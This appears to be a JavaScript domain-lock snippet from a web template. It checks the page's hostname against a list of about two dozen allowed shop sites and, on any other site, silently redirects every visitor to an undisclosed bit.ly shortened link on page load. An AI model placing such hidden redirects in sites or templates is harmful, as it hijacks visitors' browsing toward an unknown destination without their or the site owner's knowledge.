...
var xnxx = ['sukmatoko.blogspot.com','www.kjbstore.com','kjbstore.com','omtoko.blogspot.com','pasarrantau.blogspot.com','warungherbalnasatangerang.blogspot.com','ccphonecell.com','www.ccphonecell.com','shop.behabe.com','infostro.com','www.infostro.com','www.lisyeshop.xyz','lisyeshop.xyz','www.murtishop.xyz','murtishop.xyz','www.yulanshop.xyz','yulanshop.xyz','www.peternakmuda.com','peternakmuda.com','www.d-store.co.id','d-store.co.id','kr-store.blogspot.com','tokotapin.blogspot.com','toko-tapin.blogspot.com','id-zalora.blogspot.com','rianseo.com'];
var redirectURL = 'http://bit.ly/2PnZnBa';
function cekLSN(value,arr){ var status = false; for(var i=0; i<arr.length; i++){ var name = arr[i]; if(name == value){ status = true; break; } } return status; } var hst = window.location.hostname; if(cekLSN(hst, xnxx) == false) { window.location.href = redirectURL; }
